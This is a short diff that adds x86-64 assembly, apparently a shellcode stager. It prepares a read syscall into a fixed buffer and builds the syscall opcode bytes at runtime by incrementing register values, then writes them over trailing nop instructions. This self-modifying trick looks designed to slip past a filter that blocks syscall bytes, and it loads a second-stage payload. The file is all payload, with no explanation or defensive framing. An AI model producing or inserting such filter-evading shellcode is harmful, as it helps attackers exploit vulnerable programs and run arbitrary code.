@@ -1,0 +1,13 @@
+mov    rdx,0x100
+mov    esi,0x404133
+xor    edi,edi
+xor    eax,eax
+xor    ecx,ecx
+movabs rcx,0x9090909090909090
+mov    cl,0xe
+mov    ch,0x4
+inc    cl
+inc    ch
+mov    WORD PTR [rip+0x2],cx        # 0x2d
+nop
+nop 
